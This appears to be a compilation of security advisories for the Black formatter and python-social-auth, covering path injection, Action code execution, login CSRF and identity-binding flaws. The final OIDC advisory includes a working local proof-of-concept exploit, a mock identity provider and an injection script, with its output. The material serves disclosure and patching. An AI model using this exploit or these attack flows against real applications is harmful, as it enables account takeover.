vulns.description: ### Impact  Black writes a cache file, the name of which is computed from various formatting options. The value of the `--python-cell-magics` option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations.   ### Patches  Fixed in Black 26.3.1.  ### Workarounds  Do not allow untrusted user input into the value of the `--python-cell-magics` option.

Black is the uncompromising Python code formatter. Prior to 26.3.1, Black writes a cache file, the name of which is computed from various formatting options. The value of the --python-cell-magics option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations. Fixed in Black 26.3.1.

Black is the uncompromising Python code formatter. Black provides a GitHub action for formatting code. This action supports an option, use_pyproject: true, for reading the version of Black to use from the repository pyproject.toml. A malicious pull request could edit pyproject.toml to use a direct URL reference to a malicious repository. This could lead to arbitrary code execution in the context of the GitHub Action. Attackers could then gain access to secrets or permissions available in the context of the action. Version 26.3.0 fixes this vulnerability.

### Summary  The GitHub Action bundled with Black can read the version from `tool.black.required-version` if `use_pyproject` is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.  ### Details  This is similar to the previous CVE-2026-31900. The value in `tool.black.required-version` is accepted as the version to be installed by the action without validation.  ### Proof of concept  Reproduction requires a victim to use Black's GitHub Action with `use_pyproject: true`. The attacker would then issue a PR to the victim's repository with `pyproject.toml` edited so that Black points to a malicious repository.  ### Impact  This is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the `use_pyproject: true` setting.

### Impact  The SAML backend accepted SAML responses on the Assertion Consumer Service endpoint without verifying that they matched a previously issued `AuthnRequest`.  Applications using SAML account association could allow an attacker with a valid account on a trusted IdP to link the attacker's SAML identity to a logged-in victim's local account. The attacker could then authenticate through SAML and gain access to the victim's account.  The issue affects applications using the SAML backend together with authenticated account association.  ### Patches  The issue has been fixed by validating SAML responses against stored `AuthnRequest` IDs.  Users should upgrade to a patched version.  Fix:  * https://github.com/python-social-auth/social-core/pull/1794  ### Workarounds  Applications that cannot upgrade immediately should disable SAML account association for already authenticated users.  If SAML login is not required, the SAML backend can also be disabled by removing it from `SOCIAL_AUTH_AUTHENTICATION_BACKENDS`.  There is no complete workaround while continuing to allow vulnerable SAML account association.  ### Credits  Reported through GitHub private vulnerability reporting by Liyi Zhou, Ziyue Wang, Strick, Maurice, and Chenchen Yu from the University of Sydney security research team.  Reporter references:  * https://lzhou1110.github.io/ * https://zyy0530.github.io/ * https://str1ckl4nd.github.io/ * https://maurice.busystar.org/ * https://7thparkk.github.io/

### Impact  The LoginRadius backend did not validate OAuth state during the authentication flow.  Applications using this backend were vulnerable to login CSRF. An attacker could cause a victim's browser session to complete authentication using an attacker-controlled LoginRadius token, making the victim authenticated as the attacker's LoginRadius identity.  The issue affects only applications using the LoginRadius backend.  ### Patches  The issue has been fixed by enabling callback state validation for the LoginRadius backend.  Users should upgrade to a patched version.  Fix:  * https://github.com/python-social-auth/social-core/pull/1808  ### Workarounds  Applications that cannot upgrade immediately should disable the LoginRadius backend by removing it from `SOCIAL_AUTH_AUTHENTICATION_BACKENDS`.  There is no complete workaround while continuing to use the vulnerable backend.  ### Credits  Reported through GitHub private vulnerability reporting by Liyi Zhou, Ziyue Wang, Strick, Maurice, and Chenchen Yu from the University of Sydney security research team.  Reporter references:  * https://lzhou1110.github.io/ * https://zyy0530.github.io/ * https://str1ckl4nd.github.io/ * https://maurice.busystar.org/ * https://7thparkk.github.io/

### Impact  The `vk-app` backend accepted VK application callback data without verifying the callback signature when the `auth_key` parameter was omitted.  Applications using this backend could treat unsigned attacker-controlled data as a verified VK identity. An attacker could choose callback fields such as `viewer_id`, `access_token`, `api_id`, and `api_result`, potentially allowing authentication as an arbitrary VK user ID.  The issue affects only applications using the `vk-app` backend.  ### Patches  The issue has been fixed by requiring `auth_key` to be present and valid before callback data is trusted.  Users should upgrade to a patched version.  Fix:  * https://github.com/python-social-auth/social-core/pull/1811  ### Workarounds  Applications that cannot upgrade immediately should disable the `vk-app` backend by removing `social_core.backends.vk.VKAppOAuth2` from `SOCIAL_AUTH_AUTHENTICATION_BACKENDS`.  There is no complete workaround while continuing to use the vulnerable backend.  ### Credits  Reported by @lalalala5678 through GitHub private vulnerability reporting.

### Impact  The Vend OAuth2 backend used only the numeric Vend `user_id` as the social-auth UID.  When multiple Vend shops authenticate through the same application, users from different shops with the same internal Vend user ID could collide in the social-auth association table. A user from one shop could then be authenticated as the local account previously associated with the same numeric user ID from another shop.  The issue affects applications using the Vend OAuth2 backend with more than one Vend shop.  ### Patches  The issue has been fixed by scoping Vend social-auth UIDs by shop.  Users should upgrade to a patched version.  Fix:  * https://github.com/python-social-auth/social-core/pull/1795  ### Workarounds  Applications that cannot upgrade immediately should restrict the Vend OAuth2 backend to a single trusted Vend shop.  If Vend authentication is not required, the Vend backend can also be disabled by removing it from `SOCIAL_AUTH_AUTHENTICATION_BACKENDS`.  There is no complete workaround while continuing to allow authentication from multiple Vend shops with the vulnerable backend.  ### Credits  Reported through GitHub private vulnerability reporting by Liyi Zhou, Ziyue Wang, Strick, Maurice, and Chenchen Yu from the University of Sydney security research team.  Reporter references:  * https://lzhou1110.github.io/ * https://zyy0530.github.io/ * https://str1ckl4nd.github.io/ * https://maurice.busystar.org/ * https://7thparkk.github.io/

### Impact  The partial-pipeline resume mechanism accepted `partial_token` as a bearer credential without binding it to the browser session that created it.  Applications using resumable partial pipeline steps could allow an attacker to start an authentication flow, obtain a valid partial token and verification data, and cause a victim's browser to resume that attacker-controlled flow. This could authenticate the victim's browser as the attacker's account.  The issue affects applications using partial pipeline steps such as `mail_validation` or custom steps decorated with `@partial`.  ### Patches  The issue has been fixed by binding partial pipeline resumes to the originating browser session.  Users should upgrade to a patched version.  Fix:  * https://github.com/python-social-auth/social-core/pull/1816 * https://github.com/python-social-auth/social-docs/pull/444 * https://github.com/python-social-auth/social-app-django/pull/1009  ### Workarounds  Applications that cannot upgrade immediately should disable resumable partial pipeline steps, including `mail_validation` and custom steps decorated with `@partial`.  If those flows are required, applications should avoid accepting partial resume links from untrusted contexts until a patched version can be deployed.  There is no complete workaround while continuing to use the vulnerable partial-pipeline resume mechanism.  ### Credits  Reported through GitHub private vulnerability reporting by Liyi Zhou, Ziyue Wang, Strick, Maurice, and Chenchen Yu from the University of Sydney security research team.  Reporter references:  * https://lzhou1110.github.io/ * https://zyy0530.github.io/ * https://str1ckl4nd.github.io/ * https://maurice.busystar.org/ * https://7thparkk.github.io/

### Impact  Applications using the LINE Login backend are vulnerable to login CSRF / forced authentication. An attacker can start a LINE authorization flow for an account they control and trick a victim into visiting the callback URL with the attacker’s authorization code. Because the LINE backend did not validate the returned OAuth state, the application could accept the forged callback and log the victim in as the attacker-controlled LINE account.  If account linking is enabled, the same flaw can allow an attacker to link their LINE identity to a victim’s existing authenticated account, creating a persistent unauthorized login path.  ### Patches * https://github.com/python-social-auth/social-core/pull/1829  ### Workarounds   Only applications that enable the LINE backend are affected.  ### Credits  Thanks to Ta Duc Thien and Duc Anh Nguyen for reproting this via GitHub.

### Summary  The generic OpenID Connect backend (`OpenIdConnectAuth` and every backend built on it) stores the `nonce` in the shared Association table, not in the user's session. When the ID token comes back, `validate_claims` only checks that the nonce exists in that table and is not expired. It does not check that the nonce was issued to the browser that is finishing the login.  So the nonce does not do its job. OIDC Core (section 15.5.2) and RFC 9700 (section 4.5) use the nonce to stop authorization code injection: an attacker who gets hold of a victim's unused authorization code should not be able to redeem it in the attacker's own browser. With social-auth-core, the attacker can. They start their own login to get a valid `state` for their session, then hit the callback with the victim's `code` and their own `state`. `state` passes because it belongs to the attacker's session, and the nonce in the victim's ID token passes because it is in the global table. The attacker's browser is now logged in as the victim.  PKCE would block this, but `OpenIdConnectAuth` sets `DEFAULT_USE_PKCE = False` (the OAuth2 base class defaults to `True`), so the nonce is the only binding in the default setup.  ### Tested versions  social-auth-core 6.1.1 (latest), 6.1.0 and 5.2.0, with social-auth-app-django 7.1.0 and Django 6.1.2, Python 3.14. The same code is on master (098ef399c1).  ### Details  `social_core/backends/open_id_connect.py` in 6.1.1:  - line 252: `auth_params` calls `get_and_store_nonce(self.authorization_url(), state)` - lines 333 to 346: `get_and_store_nonce` stores the nonce as an `OpenIdConnectAssociation` keyed by `server_url` and `handle=nonce`. The state goes into `assoc_type` but is never read back. - lines 348 to 358: `get_nonce` looks the nonce up by `server_url` and `handle` only - lines 393 to 415: `validate_claims` accepts any stored, unexpired nonce and removes it - line 110: `DEFAULT_USE_PKCE = False`  ### PoC  Everything runs locally. `mockidp.py` is a small OpenID provider on 127.0.0.1 that checks `redirect_uri` and enforces PKCE when a `code_challenge` was sent, like a normal provider. `social_nonce.py` uses two Django test clients as two browsers.  ``` pip install social-auth-core social-auth-app-django django pyjwt cryptography python social_nonce.py ```  Output on 6.1.1:  ``` [inject] attacker session completes with victim code: (200, 'user=victim') ```  Controls:  ``` MODE=control_victim python social_nonce.py [control] victim completes normally: (200, 'user=victim')  MODE=control_unknown_nonce python social_nonce.py [control] unknown nonce: ('EXC', 'AuthResponseError: The authentication response could not be matched to the request.')  PKCE=1 python social_nonce.py [inject] attacker session completes with victim code: ('EXC', 'AuthCredentialError: The authorization code was rejected. Please restart login.') ```  So the nonce check runs, but it accepts a nonce that belongs to another browser. With PKCE on, the same attack fails.  mockidp.py:  ```python """Minimal local OpenID Provider on 127.0.0.1 for testing RP libraries.""" import json, time, secrets, threading, hashlib, base64, urllib.parse from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer import jwt from cryptography.hazmat.primitives.asymmetric import rsa  def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()  class IdP:     def __init__(self, port=0, client_id="rp-client", client_secret="rp-secret", name="idp"):         self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)         self.kid = name + "-k1"         self.client_id, self.client_secret = client_id, client_secret         self.codes = {}         self.access = {}         self.claims_override = {}         self.srv = ThreadingHTTPServer(("127.0.0.1", port), self._handler())         self.port = self.srv.server_address[1]         self.issuer = f"http://127.0.0.1:{self.port}"         threading.Thread(target=self.srv.serve_forever, daemon=True).start()      def jwk(self):         n = self.key.public_key().public_numbers()         tb = lambda i: i.to_bytes((i.bit_length() + 7) // 8, "big")         return {"kty": "RSA", "kid": self.kid, "use": "sig", "alg": "RS256", "n": b64u(tb(n.n)), "e": b64u(tb(n.e))}      def discovery(self):         i = self.issuer         return {"issuer": i, "authorization_endpoint": i + "/authorize", "token_endpoint": i + "/token",                 "userinfo_endpoint": i + "/userinfo", "jwks_uri": i + "/jwks",                 "response_types_supported": ["code"], "subject_types_supported": ["public"],                 "id_token_signing_alg_values_supported": ["RS256"],                 "token_endpoint_auth_methods_supported": ["client_secret_basic", "client_secret_post"],                 "code_challenge_methods_supported": ["S256"]}      def user_authorizes(self, authorize_url, sub):         """The end user `sub` approves an authorization request; returns (code, params)."""         q = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(authorize_url).query))         code = "code-" + secrets.token_hex(8)         self.codes[code] = {"sub": sub, "nonce": q.get("nonce"), "redirect_uri": q.get("redirect_uri"),                             "code_challenge": q.get("code_challenge")}         return code, q      def sign(self, claims):         return jwt.encode(claims, self.key, algorithm="RS256", headers={"kid": self.kid})      def _handler(idp):         class H(BaseHTTPRequestHandler):             def log_message(self, *a): pass             def _json(self, obj, code=200):                 b = json.dumps(obj).encode()                 self.send_response(code); self.send_header("Content-Type", "application/json")                 self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)             def do_GET(self):                 p = urllib.parse.urlsplit(self.path).path                 if p.endswith("/.well-known/openid-configuration"): return self._json(idp.discovery())                 if p == "/jwks": return self._json({"keys": [idp.jwk()]})                 if p == "/userinfo":                     tok = (self.headers.get("Authorization") or "").split(" ")[-1]                     sub = idp.access.get(tok)                     if not sub: return self._json({"error": "invalid_token"}, 401)                     return self._json({"sub": sub, "email": sub + "@example.test", "preferred_username": sub})                 return self._json({"error": "not_found"}, 404)             def do_POST(self):                 n = int(self.headers.get("Content-Length") or 0)                 body = dict(urllib.parse.parse_qsl(self.rfile.read(n).decode()))                 p = urllib.parse.urlsplit(self.path).path                 if p == "/token":                     rec = idp.codes.pop(body.get("code"), None)                     if not rec: return self._json({"error": "invalid_grant"}, 400)                     if rec["redirect_uri"] and body.get("redirect_uri") != rec["redirect_uri"]:                         return self._json({"error": "invalid_grant"}, 400)                     if rec["code_challenge"]:                         v = body.get("code_verifier") or ""                         if b64u(hashlib.sha256(v.encode()).digest()) != rec["code_challenge"]:                             return self._json({"error": "invalid_grant"}, 400)                     at = "at-" + secrets.token_hex(8)                     idp.access[at] = rec["sub"]                     now = int(time.time())                     claims = {"iss": idp.issuer, "sub": rec["sub"], "aud": idp.client_id, "iat": now, "exp": now + 300,                               "at_hash": b64u(hashlib.sha256(at.encode()).digest()[:16])}                     if rec["nonce"]: claims["nonce"] = rec["nonce"]                     claims.update(idp.claims_override)                     return self._json({"access_token": at, "token_type": "Bearer", "expires_in": 300,                                        "id_token": idp.sign(claims)})                 return self._json({"error": "not_found"}, 404)         return H ```  social_nonce.py:  ```python import os, sys sys.path.insert(0, os.path.dirname(__file__)) from mockidp import IdP idp = IdP() import django from django.conf import settings PKCE = os.environ.get("PKCE") == "1" settings.configure(     DEBUG=True, SECRET_KEY="x", ALLOWED_HOSTS=["*"], ROOT_URLCONF=__name__,     INSTALLED_APPS=["django.contrib.auth", "django.contrib.contenttypes", "django.contrib.sessions", "social_django"],     MIDDLEWARE=["django.contrib.sessions.middleware.SessionMiddleware", "django.contrib.auth.middleware.AuthenticationMiddleware"],     DATABASES={"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": ":memory:"}},     AUTHENTICATION_BACKENDS=["social_core.backends.open_id_connect.OpenIdConnectAuth"],     SOCIAL_AUTH_OIDC_OIDC_ENDPOINT=idp.issuer, SOCIAL_AUTH_OIDC_KEY=idp.client_id, SOCIAL_AUTH_OIDC_SECRET=idp.client_secret,     SOCIAL_AUTH_OIDC_USE_PKCE=PKCE, SOCIAL_AUTH_LOGIN_REDIRECT_URL="/done/", SOCIAL_AUTH_RAISE_EXCEPTIONS=True, ) django.setup() from django.urls import include, path from django.http import HttpResponse urlpatterns = [path("", include("social_django.urls", namespace="social")),                path("done/", lambda r: HttpResponse("user=%s" % r.user.username))] from django.core.management import call_command call_command("migrate", verbosity=0) from django.test import Client  def begin(c):     r = c.post("/login/oidc/"); assert r.status_code == 302, r.status_code     return r["Location"]  def complete(c, code, state):     try:         r = c.get("/complete/oidc/", {"code": code, "state": state})         if r.status_code == 302:             r = c.get(r["Location"])         return r.status_code, r.content.decode()     except Exception as e:         return "EXC", f"{type(e).__name__}: {e}"  victim, attacker = Client(), Client() # Victim starts a login. The provider issues a code for "victim" tied to the victim's nonce. v_url = begin(victim) code_v, qv = idp.user_authorizes(v_url, "victim") # Attacker starts a login in their own browser to get a valid state for their session. a_url = begin(attacker) _, qa = idp.user_authorizes(a_url, "attacker") mode = os.environ.get("MODE", "inject") if mode == "inject":     print("[inject] attacker session completes with victim code:", complete(attacker, code_v, qa["state"])) elif mode == "control_unknown_nonce":     idp.claims_override = {"nonce": "never-issued-nonce"}     print("[control] unknown nonce:", complete(attacker, code_v, qa["state"])) elif mode == "control_victim":     print("[control] victim completes normally:", complete(victim, code_v, qv["state"])) ```  ### Impact  An attacker who gets a victim's authorization code before it is used can log in to the relying party as the victim. Codes leak in practice through the callback URL: Referer headers, proxy or server logs, browser history and sync, a malicious browser extension, or an open redirect on the callback. This is the exact case the OIDC nonce is meant to cover. The attacker does not need the client secret, because the relying party itself redeems the code.  It affects every app that uses `OpenIdConnectAuth` or a backend built on it with the default settings (PKCE off).  ### Suggested fix  Bind the nonce to the session that started the login. For example, keep the nonce (or a hash of it) in the session next to `state` in `auth_params`, and in `validate_claims` compare the ID token nonce with the session value before removing it. Turning PKCE on by default for the OIDC backend would also close this, and matches the OAuth2 base class.
